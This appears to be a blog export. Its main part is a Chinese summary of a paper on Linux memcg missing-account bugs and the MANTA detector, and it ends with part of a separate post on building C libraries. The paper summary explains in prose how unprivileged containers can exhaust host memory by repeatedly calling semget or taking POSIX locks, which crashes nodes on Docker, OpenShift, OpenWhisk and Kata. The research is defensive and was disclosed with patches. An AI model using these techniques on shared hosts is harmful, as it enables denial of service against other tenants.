数据结构：memcg的核心数据结构是mem_cgroup，它代表一个memcg实例。memcg包含4个页面计数器，对应于之前讨论的4种类型的已记账内存。每个页面计数器使用usage（第14行）来计算分配的页面数量。同时，总内存限制（以页面为单位）设置在max（第16行）。在内存充电时，Linux内核调用消耗接口，依次调用page_counter_try_charge，这是一个计算总使用量（第24行）并将其与最大限制（第25行）进行检查的函数。 Accounting challenges：由于Linux内核中众多的内存分配接口和庞大的分配路径，正确地对Linux内核中的内存使用情况进行记账非常具有挑战性。很难调解所有内存分配路径，因此当前的记账机制容易出错。 12345678910111213141516171819202122232425262728293031struct mem_cgroup&#123; ... struct page_counter memory;/*Both v1 &amp; v2*/ union&#123; struct page_counter swap;/*v2 only */ struct page_counter memsw;/*v1 only*/ &#125;; /*Legacy consumer-oriented counters*/ struct page_counter kmem;/*v1 only*/ struct page_counter tcpmem;/*v1 only*/ ...&#125;struct page_counter&#123; atomic_long_t usage; ... unsigned long max; ...&#125;bool page_counter_try_charge(struct page_counter *counter,unsigned long nr pages,...)&#123; struct page_counter *c; ... new = atomic_long_add_return(nr_pages, &amp;c-&gt;usage);if(new&gt;c-&gt;max)&#123; ... goto failed;&#125;&#125; Container Runtimes and PlatformsMemcg可以记录和限制每个进程级别的内存使用情况。与基于虚拟机(VM)的内存控制技术相比，memcg粒度更细、更轻、更灵活。因此，memcg已经被Docker、CaaS (container -as- service)和FaaS (function -as- service)平台广泛采用。具体来说，CaaS平台为用户提供了已配置的容器实例。CaaS平台上的用户可以使用自定义的容器映像创建&#x2F;启动&#x2F;停止&#x2F;删除容器。另一方面，FaaS平台不向用户提供容器实例，而是允许用户输入函数和触发规则，并自动创建容器实例来执行输入函数。 Docker和CaaS&#x2F;FaaS平台通常为容器实例使用本地容器运行时(即runC)。为了提高容器之间的隔离性，人们提出了安全容器运行时，如gVisor和Kata容器。gVisor是谷歌开发的沙盒容器运行时。它在一个名为Sentry的用户空间内核上运行每个容器。Sentry拦截并处理来自容器的大多数系统调用。因此，Sentry减少了从容器在主机内核上调用的系统调用。除了沙盒运行时，容器社区还建议使用虚拟化来隔离容器实例。其中一个这样的虚拟化容器运行时是Kata容器，其中每个容器实例都在微型虚拟机中运行，以实现强隔离。 我们的实验表明，正常和安全的容器运行时(包括runC和Kata容器)都容易受到由记账丢失错误引起的内存耗尽攻击。此外，内存记账丢失漏洞可以被利用来攻击Docker、CaaS和FaaS平台，导致内存耗尽，从而导致单个节点甚至整个集群崩溃。 A STUDY OF EXPLOITABLITY AND IMPACT生产环境中内存未记录错误的影响从未被系统地研究过。它们通常被视为一个较小的正确性问题，而不是安全问题。在这一部分中，我们展示了内存未记录错误可以被利用来导致容器主机甚至整个云平台的内存耗尽。特别是，我们分析了内存记账问题的可利用性，以了解其对容器平台的实际影响。我们设计了新的攻击方法来利用未记录错误。这些攻击表明，这些错误可用于攻击普通和安全的容器运行时。因此，它们可被利用在热门的CaaS和FaaS容器平台上造成DoS（主机机器崩溃）和财务费用问题。在以下内容中，我们首先讨论威胁模型和假设。接下来，我们详细介绍如何利用内存未记录问题。 Threat Model and Assumptions在我们的实验中，我们研究了三个容器平台 - Docker、容器即服务（CaaS）平台和函数即服务（FaaS）平台。我们使用广泛部署的CaaS平台 - OpenShift作为我们的CaaS平台，以及流行的OpenWhisk作为我们的FaaS平台。这三个平台使用本地运行时（即runC）作为它们的容器运行时。这三个平台上的所有容器都以非特权方式设置为具有默认功能和seccomp配置。对于Docker和CaaS平台，用户可以通过云提供的接口创建和启动带有自定义映像的容器。这是合理的，因为包括AWS、Google Cloud和Azure在内的所有云供应商都为用户提供了一个控制台来管理容器实例。对于FaaS平台，用户可以定义、部署和触发函数，其中每个函数实例都在一个容器中运行。 攻击者是使用Docker、CaaS和FaaS平台的恶意用户。他&#x2F;她可以在非特权容器内执行任意代码。然而，容器的功能受到默认功能的限制。为了进一步限制攻击者，我们假设攻击者无法从容器中逃逸，也无法提升他们的权限。攻击者的目标是破坏内存计算的限制，并耗尽主机上的所有内存，以使其他容器、函数或主机崩溃。 对于攻击环境，我们在本地机器上设置Docker，同时在Google Cloud上设置OpenShift和OpenWhisk集群。出于道德考虑，该集群构建在一个由Google Cloud提供的专用裸金属服务器上，仅供我们使用，因此不会影响其他用户。 Exploit Missing-Account Problem在本节中，我们将设计新的攻击来利用内存记帐中的记账问题，以了解其影响。如前所述，Linux内核中的当前内存记帐将内存记帐接口放在内存分配路径上，将内存取消记帐接口放在内存空闲路径上。然而，Linux内存管理是复杂的，包含数千个内存分配和自由路径。很难用正确的接口来调解所有这些问题。特别是，很容易遗漏一个内存分配路径，从而导致丢失帐户问题。 显示了内核中信号量对象和信号量数组上的记账丢失错误，由MANTA检测并由Linux开发人员确认。函数sem_alloc分配一组信号量，并使用sem_array对它们进行索引。第8行的分配站点调用kvzalloc为sem_array和信号量分配内存。当在kvzalloc的第三个参数中设置了__GFP_ACCOUNT标志时，内核只会考虑分配的内存。然而，在第8行对kvzalloc的调用没有指定__GFP_ACCOUNT标志，导致在分配的信号量和sem_array上丢失帐户。此外，sem_alloc由semget系统调用调用来分配信号量。因此，这个记账丢失的错误很容易从用户空间触发。我们进一步设计了新的攻击，以表明上述漏洞可以被利用来打破容器内存限制并耗尽所有主机内存。 12345678910111213static struct sem_array *sem_alloc(size_t nsems)&#123; struct sem_array *sma; if(nsems &gt; (INT_MAX - sizeof(*sma)) / sizeof(sma-&gt;sems[0])) return NULL; sma = kvzalloc(struct_size(sma, sems, nsems),GFP_KERNEL); if(unlikerly(!sma)) return NULL; return sma;&#125; Attacking Docker我们用默认的功能和seccomp配置来设置Docker。semget系统调用不需要任何功能，也不会被容器seccomp配置文件阻塞。因此，在我们的实验中，攻击程序在非特权容器中可以反复触发semget系统调用，从而打破内存记帐限制，耗尽所有主机内存。主机甚至会因为内存不足错误而崩溃。我们向Linux社区报告了上述错误并提交了补丁。补丁已经被合并到Linux主线上，一个新的CVE已经分配给我们了。 Attacking the CaaS Platform我们在Google Cloud上搭建了一个自管理的OpenShift集群，运行所有的GCP虚拟机实例。该集群允许用户在一个具有15GB内存和Linux内核v5.14.14的节点上创建容器。我们将容器的内存限制设置为128MB，这是公共云中常用的内存大小。 为了发起攻击，恶意用户以普通用户权限创建一个容器，并在容器内分配大量信号量。恶意容器的内存使用量迅速增加，大约在20秒内达到节点的极限。相比之下，攻击者的计费内存使用量非常低，不到1.4MB。结果，恶意容器打破了128MB的内存限制，消耗了主机上的全部15GB内存。同一节点上的受害者容器由于内存不足无法执行任何操作。 Attacking the FaaS Platform我们评估了对OpenWhisk的攻击，OpenWhisk是一个流行的开源FaaS平台，作为IBM Cloud Functions的基础设施。集群节点内存为15GB，运行Linux内核v5.11.0-1021-gcp。每个功能的内存限制设置为128MB。 为了发起攻击，恶意用户创建了一个反复消耗信号量的函数。然后，恶意用户反复触发恶意功能。导致节点上的内存很快耗尽。注意，当一个节点的内存耗尽时，连续的恶意函数将被分派到其他节点。导致集群内所有节点的内存被恶意用户耗尽，导致集群级DoS。 Attacking the Secure Runtime我们进一步设计新的攻击来评估内存记账丢失对安全运行时- Kata容器的影响。我们的实验表明，内存记账丢失漏洞允许攻击者打破Kata容器的隔离并攻击主机和其他容器实例。 Kata容器是一种虚拟容器运行时，其中每个容器实例在微虚拟机中运行，以实现强隔离。但是，Kata micro-VM将文件操作转发给主机，这使得它容易受到基于内存记账丢失的攻击。更具体地说，通过利用内存记账丢失错误，攻击者可以耗尽微型虚拟机中Kata容器的主机内存。如图所示，恶意用户是容器中的普通用户，并发出fcntl系统调用，为一组文件分配大量POSIX锁。但是，客户机内核将请求转发给运行在主机上的virtio-fsd守护进程。 因此，守护进程在主机内核中分配了 POSIX 锁。尽管 virtio-fsd 守护进程的内存使用受到 memcg（内存控制组）的限制，但锁对象所使用的内存没有被纳入统计。因此，恶意容器可以耗尽主机上的所有物理内存。我们向 Kata 容器社区报告了这种攻击。他们确认了这个问题，并为我们申请了一个新的 CVE（公开披露的计算机安全漏洞和漏洞）。 用通俗的语言来说，这段话描述了一个安全问题，其中，虚拟文件系统管理的守护程序在主机操作系统上分配了一种名为 POSIX 锁的资源。虽然这个守护程序的内存使用受到限制，但锁对象占用的内存没有被计算在内。这意味着一个恶意的容器（一种轻量级的虚拟化技术）可以利用这个问题耗尽主机的物理内存。作者报告了这个问题，并且 Kata 容器社区已经确认该问题，并正申请一个新的安全漏洞编号（CVE）。 Discussion正如上述攻击所证明的那样，可以利用记账丢失漏洞攻击正常和安全的容器运行时、Docker和CaaS&#x2F;FaaS平台。攻击者可以利用这些漏洞耗尽所有内存，使容器节点甚至整个集群崩溃。更糟糕的是，攻击只需要普通用户权限，因此很容易启动。虽然内存丢失帐户漏洞可以被利用来攻击容器平台，但目前还没有系统的研究来检测和消除这些漏洞。因此，本文提出了第一个内存记账分析工具MANTA，来系统地检测这些问题。 MISSING-ACCOUNT BUG DETECTION考虑到内存记账丢失错误的严重性，在操作系统内核实际在生产场景中运行之前的早期阶段检测这些问题非常重要。不幸的是，没有一种工具可以同时检测高代码覆盖率和高精度的遗漏帐户错误。因此，我们提出了MANTA(Memory AccouNTing Analyzer的缩写)来自动检测内存记账丢失错误。 Design goals MANTA旨在通过分析记帐接口放置的正确性来自动、系统地检测内存记账丢失错误。具体来说，MANTA需要检测具有高代码覆盖率的内存记账丢失错误。 为了实现这一点，MANTA利用静态分析来遍历Linux内核中的所有内存分配&#x2F;自由路径。此外，MANTA需要高精度地检测漏洞。因此，MANTA使用动态验证来测试检测到的错误的动态触发性。 Challenges 为了实现这两个目标，MANTA需要克服以下挑战。 C1. MANTA需要识别内存记帐接口，这些接口在内核文档中没有描述，以前的工作也没有研究过。现有的用于内存分配的接口识别方法不能应用，因为它们的启发式方法不适用于内存计费接口 C2. MANTA需要决定每个内存分配是否被考虑并且只考虑一次。然而，在Linux内核中，从内存分配站点到内存记帐站点的执行路径往往是深的、嵌套的和交错的。此外，即使存在这样的路径，记帐也可能受到条件标志的影响，因为记帐同时需要记帐接口和记帐标志§2 Analysis techniques and workflow MANTA的体系结构如图所示。以整个内核IR作为输入，MANTA首先生成内核调用图。然后，它使用基于页面计数器的方法来识别所有会计接口以地址C1(§4.1)。基于记帐接口，MANTA建立了内存分配&#x2F;释放和内存记帐之间的映射(§4.2)。 之后，MANTA使用记帐标志分析来进一步分析内核内存记帐(§4.3)。这两种技术处理C2。随着检测到的内存记账错误，MANTA进一步评估每个错误与我们的动态触发性分析基于数千个测试用例从Linux测试项目(§4.4)。MANTA目前是为Linux内存记账实现的。下面，我们将详细介绍每种分析技术。 Counter-based Interface IdentificationMANTA首先需要识别内存记账接口。 这些接口是多种多样的，并且可以自定义。使用自然语言处理(NLP)或包装函数分析的现有技术存在精度问题。我们注意到内存记帐必须维护内存使用计数器(即page_counter)，这些计数器是通过特定的原子函数操作的。使用类型匹配可以很容易地找到内存使用计数器。因此，通过识别用于增加&#x2F;减少这些计数器的基本函数，MANTA可以自动找出对会计计数器执行增加&#x2F;减少操作的所有函数。 具体来说，MANTA遍历每个内核IR指令并检查它是否增加&#x2F;减少page_counter。如果是这样，则MANTA将直接包含该指令的函数标记为基本会计函数。由于在Linux内核中，page_counter仅由memcg使用，因此我们的方法可以达到较高的精度。 然后，MANTA根据基本的记账功能识别会计接口。MANTA使用DFS从基本记账函数向后遍历，并在内核调用图上标记所有访问过的函数。每当它到达memcg子系统之外的函数时，MANTA就会停止遍历，因为它不能是memcg接口。在这些记录内存使用情况的标记函数中，如果一个函数是从memcg子系统外部调用的，即，定义memcg功能的源文件，MANTA将其标记为一个记录接口。这样，MANTA就可以识别所有的计费接口。 让我们使用图中的示例来说明基于计数器的接口标识中的步骤。首先，MANTA遍历所有核函数的所有基本块。在__memcg_kmem_charge中，它标识page_counter函数(第6行)并双重确认第一个参数来自memcg。之后，MANTA进入page_counter_try_charge，发现它增加了page_counter的一个字段。由于__memcg_kmem_charge直接调用page_counter函数并增加page_counter的值，因此MANTA认为__memcg_kmem_charge是一个基本的计费接口。 类似地，对于减少page_counter值的接口，MANTA将其标记为未收费接口。此外，MANTA可以区分不同内存类型的接口，因为memcg对每种内存类型使用不同的page_counters(§2)。在第6行，page_counter_try_charge使用了&amp;memcg-&gt; kmemm，因此MANTA知道__memcg_kmem_charge用于内核内存记帐。 从基本的收费接口开始，MANTA然后沿着调用链逐步识别所有的收费接口包装器。如果一个函数调用基本的计费接口，并且计费量来自于它的参数，MANTA将把它标记为一个计费接口包装器。使用图中的相同示例，__memcg_kmem_charge_page调用基本收费接口__memcg_kmem_charge(第29行)，而收费金额1&lt;&lt;order由__memcg_kmem_charge_page的参数控制。 因此，MANTA认为__memcg_kmem_charge_page是一个收费包装器，因为它只是将收费数量传递给基本收费接口，并且对收费数量没有控制。 MANTA使用相同的方法来检测未充电的包装器。 对于charge&#x2F;uncharge接口，MANTA还需要识别内存分配&#x2F;空闲接口。MANTA采用现有技术来产生初步结果。此外，通过观察内存分配&#x2F;释放接口增加&#x2F;减少struct free_area的nr_free计数器，MANTA使用类似的基于计数器的方法来提高结果的精度。 123456789101112131415161718192021222324252627282930313233343536int __memcg_kmem_charge(struct mem_cgroup *memcg, gfp_t gfp,unsigned int nr_pages)&#123; struct page_counter *counter; ... if(!cgroup_subsys_on_dfl(memory_cgrp_subsys)&amp;&amp;!page_counter_try_charge(&amp;memcg-&gt;kmem,nr_pages,&amp;counter)) &#123;...&#125; ...&#125;bool page_counter_try_charge(struct page_counter *counter,unsigned long nr_pages,struct page_counter **fail)&#123; struct page_counter *c; for(c = counter; c;c = c-&gt;parent)&#123; long new; new = atomic_long_add_return(nr_pages,&amp;c-&gt;usage); ... &#125; ...&#125;int __memcg_kmem_charge_page(struct page *page, gtp_t gtp,int order)&#123; struct mem_cgroup *memcg; int ret = 0; memcg = get_mem_cgroup_from_current(); ... ret = __memcg_kmem_charge(memcg,gfp,1&lt;&lt;order); if(!ret)&#123; page-&gt;mem_cgroup = memcg; ... &#125; ...&#125; Alloc-Charging Mapping Analysis直观地说，每个分配的对象应该只被计算一次。否则，对象可能会被漏记。因此，MANTA 的下一步是建立内存分配&#x2F;释放和计费&#x2F;取消计费之间的关系。基于这种关系，MANTA 可以识别比分配&#x2F;释放的内存少收费或多退费的情况，将其视为漏记错误。简洁起见，我们关注分配和计费。同样的技术可以应用于分析free-uncharging映射。 由于深层次的调用关系和复杂的内存指针传播，从源代码分析分配和计费之间的映射并非易事。为了解决这些问题，我们开发了分配计费(allocation and charging)映射分析。基本思路是首先将函数内的内存分配和计费总结为函数摘要(function summary)，然后基于函数摘要构建内存分配-计费映射，以检测漏记错误。更具体地说，我们使用基于访问路径的分析来生成每个函数的摘要。访问路径的概念首次用于 SATURN 框架，用于表示转义对象的每个函数摘要（即对象指针泄漏到当前函数之外）。 如图左侧算法所示，MANTA 首先为所有函数生成函数摘要（第 2 行）。接下来，对于一个函数𝑓，通过收集其被调用者的函数摘要并分析内存分配位置（IsAlloc），MANTA 可以构建 𝑓 内所有非转义对象的分配-计费映射（第 4-9 行）。具体而言，MANTA 用传递给被调用者的参数替换被调用者摘要中的变量，以计算 𝑓 中分配的页面，这被称为源敏感跟踪。然后，MANTA 通过调用 CheckPage 来分析 𝑓 内的分配-计费映射。在 CheckPage 中，MANTA 能够报告非转义对象的漏记错误（第 19 行）。对于从 𝑓 转义的对象（第 14-18 行），它们最终将在一个函数中（例如 𝑓 的调用者）处理，因为内核中的所有函数都被遍历（第 3-10 行）。此外，IsCharged（第 13 行）和 IsDupCharged 函数（第 21 行）都进行数据流分析，将局部对象连接到被调用函数的返回值或参数。这样，他们可以使用被调用者的函数摘要跟踪内核对象的计费状态。 我们使用图右侧的具体示例来演示算法。MANTA首先为底层内存分配函数__alloc_pages_nodemask生成摘要。 MANTA识别到页面由较低级别的函数get_page_from_freelist返回、充电，并返回。因此，页面既逸出又充电，函数摘要应为（__alloc_pages_nodemask，retval，retval）。当MANTA分析do_anonymous_page时，它会获取alloc_zeroed_user_highpage_movable的函数摘要，该函数是__alloc_pages_nodemask的包装器，具有相同的摘要。根据函数摘要，MANTA确定do_anonymous_page中的页面已经充电。在分析do_anonymous_page内部的分配-计费映射时，MANTA发现内存核算位于第18行可从第14行到达，页面可能在第18行再次被计费。因此，MANTA在这种情况下报告了一个冗余帐户警告。另一方面，如果当前函数中的页面未被计费且不会逸出，MANTA会报告一个未记录错误。 12345678910111213141516171819struct page * __alloc_pages_nodemask(...)&#123; ... page = get_page_from_freelist(alloc_mask, order, alloc_flags, &amp;ac); ... if(memcg_kmem_enabled()&amp;&amp;(gtp_mask&amp;__GFP_ACCOUNT)&amp;&amp;page&amp;&amp;unlikely(__memcg_kmem_charge_page(page,gfp_mask,order)!=0)) &#123;...&#125; ... return page;&#125;static vm_fault_t do_anonymous_page(struct vm_fault *vmf)&#123; page = alloc_zeroed_user_highpage_movable(vma, vmf-&gt;address); if(!page) goto oom; if(mem_cgroup_charge(page, vma-&gt;vm_mm, GFP_KERNEL) ...&#125; Accounting Flag Analysis发现仅依靠分配和记账站点的映射来检测记账丢失错误是不够的，因为内存记账通常是有条件的。特别是在 Linux 内核中，只有当将 __GFP_ACCOUNT标志传递给记账接口时，才会对内核对象内存进行记账。因此，如果没有提供 __GFP_ACCOUNT 标志，记账接口仍然不会对内存进行记账。因此，分析记账标志的值对于检测记账丢失至关重要。因此，MANTA 对记账标志进行分析，以确定是否将记账标志 __GFP_ACCOUNT 传递给记账接口。 Bit-wise and inter-procedural analysis MANTA采用程序间逐位数据流跟踪方法来实现会计标志分析。首先，在计费点，MANTA检查GFP标志本身是否为常数。如果是，MANTA直接检查__GFP_ACCOUNT的位。否则，MANTA将递归地跟踪标志的use-def chain，直到确认其记帐标志位。虽然LLVM提供了一个可以跟踪位值传播的值跟踪分析通道，但该分析仅限于过程内。为了跟踪程序间记帐位，MANTA用两个分析规则扩展了通道。具体来说，当MANTA跟踪函数的参数时，它跟踪所有调用函数以跟踪传递给参数的值;当MANTA跟踪调用站点的返回值时，它也跟踪被调用函数并跟踪所有可能的返回值。如果设置了__GFP_ACCOUNT, MANTA将内核内存标记为在分配点被占用。否则，即使有charging接口，MANTA也会将内存视为not-charged。 对kmem_cache分配的分析略有不同，因为分配也受到kmem_cache的创建标志的影响。 如果kmem_cache是用SLAB_ACCOUNT标志创建的，那么来自kmem_cache的所有分配都会被计算在内。因此，对于与kmem_cache相关的分配，MANTA也会找到kmem_cache的初始化位置，并采用相同的记帐标志分析技术来计算SLAB_ACCOUNT标志。 Dynamic Validation静态分析可能有误报。MANTA检查每个记账丢失分配的系统调用的静态可达性，并过滤掉不可达的。然而，静态可达的bug不一定在运行时触发。因此，MANTA通过动态验证进一步分析静态检测错误的触发性。观察到Linux测试项目(LTP)包含所有300个系统调用的测试用例，我们利用这些测试用例来检查检测到的错误的动态触发性。更具体地说，我们首先检测代码以拦截每个丢失的记账分配，这样我们就可以确认是否确实达到了它。 接下来，我们运行LTP的系统调用和容器测试套件(包含1,469个测试用例)，以检查是否触发了错误。 此外，我们手动运行现有的工具或开发新的测试用例来触发LTP无法触发的错误。其中一些bug与特定的内核特性密切相关，不能被一般的LTP测试用例(例如keexec和selinux)触发。 因此，我们手动运行相关的用户空间工具来触发它们。 其他原因是由于LTP发现的特定系统调用参数，我们手动开发测试用例来传递这些参数。 对于可以动态触发的记账丢失错误，我们进一步开发了内存耗尽概念验证(PoC)来评估它们的安全风险。我们基于触发记账丢失错误的测试用例开发PoCs。特别是，我们反复调用可能触发PoCs中记账丢失错误的系统调用，并记录记账丢失的内存量。此外，一些记账丢失的分配受到某些约束，例如ulimit和sysctl变量。在不损失通用性的情况下，我们对Amazon Fargate等云服务采用了相同的约束设置。这些PoCs的细节将在§5.2中介绍。 Implementation我们用4K行的c++代码将MANTA作为LLVM12的一个通道来实现。所分析的Linux内核是v5.10，具有x86-64的默认配置。MANTA使用wllvm和Clang在默认配置下为整个内核生成IR位码。 vmlinux的位码大小为481MB。MANTA使用PeX方法来解析间接调用并生成调用图。 使用建议的技术，MANTA能够在大约三分钟内完成分析，使其具有足够的可扩展性，可以应用于每个Linux主要版本。 MANTA RESULT在本节中，我们首先给出了MANTA的分析结果。接下来，我们评估了MANTA的查准率和查全率。之后，我们将介绍影响分析以及Linux内核社区报告和修复的错误。最后，我们讨论了MANTA的局限性。 Result OverviewMANTA检测到242个记账丢失的错误，这些错误可以通过60590个不同的路径从273个系统调用中静态地到达。具体来说，用户空间可触发的bug数量为162个，其中LTP触发的bug有134个，现有工具触发的bug有23个，手工开发的测试用例触发的bug有5个。 剩下的80个bug不能被触发，触发失败的原因主要是深度调用路径（80个案例中的72个）。其余的8个分配在内核文档中被明确标记为豁免，或者用于内核内部使用。请注意，这72个没有触发的bug并不都是假阳性，因为我们的测试案例只覆盖了一部分执行路径。保守地说，MANTA的精度大于66.9%（162&#x2F;242）。 我们还通过手动删除会计标志来评估MANTA的召回率。更具体地说，我们首先通过删除kernel&#x2F;子目录下现有的会计标志来生成一个评估集。所有受影响的分配点都被收集在评估集中。特别是，我们删除了11个SLAB_ACCOUNT标志，用GFP_KERNEL替换了5个GFP_KERNEL_ACCOUNT，总共影响了19个内存分配，如表所示。然后我们在修改后的内核代码上运行MANTA，评估结果显示，MANTA可以检测到所有19个缺失的站点。虽然评估的站点有限，但仍表明MANTA有很高的召回率。 此外，MANTA没有发现任何多余的账户漏洞。 Impact Analysis如前所述，为了理解检测到的错误的影响，我们进一步开发基于LTP测试用例的概念验证(PoCs)。更具体地说，我们已经开发了17个PoCs，它们涵盖了47个可以从用户空间重复触发的错误，如表所示。我们在具有16GB RAM的QEMU x86_64机器上开发和测试PoCs。Linux发行版是带有Linux内核v5.10的Debian Buster。所有poc都运行在受memg限制的环境中，并具有Docker运行时应用的默认功能集。 除了PoCs覆盖的bug之外，由于时间和领域知识的限制，我们没有为其他可触发的bug开发PoCs。 然而，这些漏洞也可能被具有相应领域知识的攻击者反复可靠地触发。 Reporting to Linux Community我们已经向Linux内核社区报告了53个bug，包括所有47个可以由17个用户空间poc触发的bug和6个可以由内核操作反复触发的bug。这些bug的完整列表列在附录A的表中。 在所有报告的bug中，有37个已经被内核开发人员确认。所有这37个bug的补丁都提交了，其中18个已经合并，19个待合并。 由于memcg子系统目前没有维护它的git子树，所以修补过程很慢。因此，memcg维护者不跟踪提交的补丁，并期望补丁作者将通过其他子系统维护者向上游推送补丁。这引入了许多额外的讨论和审查，从而显著地减缓了合并过程。 在与内核开发者的交流中，我们发现内核社区对这些bug非常关注。一位内核开发人员强调，memcg“不仅仅是粗略的记账估计”，而且“应该考虑由用户空间触发的未绑定分配”。此外，内核开发人员对MANTA非常感兴趣，并邀请我们使用我们的工具和实验来测试他们的内核。 LimitationsMANTA目前有以下限制。 Static analysis is not sound 由于路径不敏感的函数摘要，MANTA的分析可能会错过记账丢失的错误。当函数在另一条执行路径上对已分配的页进行收费时，它可能不会在其中一条执行路径上对该页收费。在这种情况下，MANTA仍然将功能总结为收费，并在以后的分析中忽略丢失帐户的错误。相反，如果MANTA将功能总结为不收费，则会忽略冗余帐户错误。在未来，我们计划采用像SATURN框架这样的路径敏感摘要来提高稳健性。 Dynamic triggerable test is not complete 目前，MANTA使用LTP测试用例来测试是否可以触发静态检测错误。LTP测试用例是有限的。这些测试用例不可能涵盖内核中所有可能的执行路径。 因此，由于不完整的代码覆盖，MANTA可能会错过一些可触发的错误。因此，我们未来的工作之一是开发更多的测试用例，并采用模糊测试技术来增加代码覆盖率。 RELATED WORKMemory AccountingJRes为JVM实现内存计费接口。内存记帐接口在对象分配期间收取内存使用费用，在垃圾收集期间收取费用。但是，JRes没有为共享对象实现充电机制。 Price等和MzSchem为用户空间运行时环境提出了基于消费者的内存计费方案，以计算子任务的内存使用情况。它们选择向实际用户收取内存使用费用，而不是向内存分配器收取。它们修改运行时垃圾收集器，以便它可以在释放对象之前释放对象，并将其重新充值到保存其引用的实体中。然而，由于在内核中实现足够高效的垃圾收集仍然是一个挑战，因此很难在内核中直接采用它们。基于vm的工作提供了更好的内存隔离，并且可以解决单片内核中的每个进程记帐问题。然而，传统的基于vm的方案过于重量级，并且引入了很高的性能开销。与基于容器的方案相比，基于unikernel的方法实现了更低的启动延迟和更高的吞吐量，但缺乏兼容性。 MANTA的分配-充电映射分析类似于内存泄漏检测中使用的分配-自由映射分析。泄漏检查器使用上下文和路径敏感的分析方法来检测内存泄漏。Saber和FaskCheck使用按需稀疏价值流分析来检测内存泄漏。LeakFix首先尝试定位导致泄漏的空闲内存并修复它。AutoFix通过结合静态分析和运行时检查来检测和修复内存泄漏。PCA使用选择性流敏感算法进一步加快程序间数据流分析的内存泄漏检测。然而，这些工作依赖于手动输入或特定的启发式来决定分配&#x2F;释放接口，这不能应用于识别内存计费接口。 Resource AccountingHoudini的escape利用内核下半部分的工作线程、服务进程和中断来绕过控制组的限制。然而，它没有关注memcg，也没有分析对照组的实施情况。对比胡迪尼的越狱，我们系统地定义了memcg中可能存在的问题，识别并报告了memcg中的53个bug。Yang等提出了抽象资源的概念，并发现在容器内耗尽这些资源会导致对主机的DoS攻击。资源容器提出了一个操作系统级别的抽象来考虑整个系统的资源使用情况。它是描述在每个线程级别计算一般资源的方法的第一本书。与以前的工作相比，资源容器工作在系统内核上，可以解决由用户线程引起的内核资源消耗。Zhang等提出将内核下半进程的cpu时间使用收费给受影响的用户进程，以提高公平性。 Perez等人观察到EVM的气体计量与工作节点上的实际资源消耗，特别是CPU周期不一致。它表明，当页面缓存工作不佳时，实际的不一致性会进一步增加，而支付者则要为相同数量的gas付费。本文还提出了一种能够充分利用不一致性的自动合成有效载荷的方法。Liu发现CPU时间计量在各种真实的云平台上都很脆弱。他们提出了6种可以利用进程启动时或运行时的CPU计量的攻击。 CONCLUSION AND FUTURE WORK本文首次系统地分析和检测了Linux系统中存在的内存记账缺失问题。我们进行了深入的分析，以了解容器平台上内存记账丢失错误的可利用性和安全影响。 我们的分析表明，所有容器运行时(包括正常运行时和安全运行时)都容易受到由记账丢失错误导致的内存耗尽攻击。此外，内存记账丢失漏洞可以被利用来攻击Docker、CaaS和FaaS平台，导致内存耗尽，从而导致节点甚至整个集群崩溃。 然后，我们提出了MANTA，它结合了静态和动态分析技术，以高代码覆盖率和精度自动检测内存记账丢失错误。我们的检测工具报告了53个可利用的内存丢失帐户错误，其中37个已被内核开发人员确认，分配了两个新的cve。结果表明，MANTA可以有效地缓解内存记帐系统中的记账丢失问题。 我们未来的工作是研究如何在不调解所有内存分配&#x2F;自由路径的情况下准确地计算内存使用情况。","categories":[{"name":"论文精读","slug":"论文精读","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/"},{"name":"内核安全","slug":"论文精读/内核安全","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/"}],"tags":[]},{"title":"C++ 学习 Linux系统编程 库","slug":"C++-学习-Linux系统编程-库","date":"2023-04-22T02:39:33.000Z","updated":"2023-05-14T07:19:46.476Z","comments":true,"path":"2023/04/22/C++-学习-Linux系统编程-库/","link":"","permalink":"http://example.com/2023/04/22/C++-%E5%AD%A6%E4%B9%A0-Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-%E5%BA%93/","excerpt":"什么是库 库文件是计算机上的一类文件，可以简单的把库文件看成一种代码仓库，它提供给使用者一些可以直接拿来用的变量。 库是一种特殊的程序，编写库的程序和编写一般的程序区别不大，只是库不能单独运行。 库文件有两种：静态库和动态库（共享库），区别是：静态库在程序的连接阶段被复制到了程序中；动态库在连接阶段没有被复制到程序，而是程序在运行时由系统动态加载到内存中供程序调用 库的好处：1、代码保密 2、方便部署和分发 命名规则 Linux:libXXX.a lib:前缀（固定） XXX：库的名字，自己起 .a：后缀（固定） Windows：libXXX.lib 静态库的制作 gcc获得.o文件 将.o文件打包，使用ar工具（archive） 1ar rcs libxxx.a xxx.o xxx.o","text":"什么是库 库文件是计算机上的一类文件，可以简单的把库文件看成一种代码仓库，它提供给使用者一些可以直接拿来用的变量。 库是一种特殊的程序，编写库的程序和编写一般的程序区别不大，只是库不能单独运行。 库文件有两种：静态库和动态库（共享库），区别是：静态库在程序的连接阶段被复制到了程序中；动态库在连接阶段没有被复制到程序，而是程序在运行时由系统动态加载到内存中供程序调用 库的好处：1、代码保密 2、方便部署和分发 命名规则 Linux:libXXX.a lib:前缀（固定） XXX：库的名字，自己起 .a：后缀（固定） Windows：libXXX.lib 静态库的制作 gcc获得.o文件 将.o文件打包，使用ar工具（archive） 1ar rcs libxxx.a xxx.o xxx.o r 将文件插入备存文件中 c 建立备存文件 s 索引 静态库的制作我们现在有如下文件： 首先我们将其编译为.o文件，运行如下命令： 1gcc -c add.c div.c mult.c sub.c 结果如下： 输入命令制作静态库： 1ar rcs libcalc.a add.o sub.o mult.o div.o 我们生成静态库文件如下： 静态库的使用如图所示，在文件夹里我们有如下文件： 我们从头编译静态库文件 我们在.&#x2F;library文件夹下依次运行如下命令 1cd src 1gcc -c add.c div.c mult.c sub.c -I ../include/ 1ar rcs libcalc.a add.o div.o mult.o sub.o 1mv libcalc.a ../lib/ 1cd .. 1gcc main,c -o app -I ./include/ -L ./lib/ -l calc 执行完上述所有指令后我们运行： 1tree 如图所示： 我们运行下列命令，运行app文件： 1./app 动态库的制作与使用命名规则： Linux：libxxx.so lib: 前缀（固定） xxx：库的名字，自己起 .so：后缀（固定） 在Linux下是一个可执行文件 Windows：libxxx.dll 动态库的制作： gcc得到.o文件，得到和位置无关的代码 1gcc -c -fpic/-fPIC a.c b.c gcc得到动态库 1gcc -shared a.o b.o -o libcalc.so 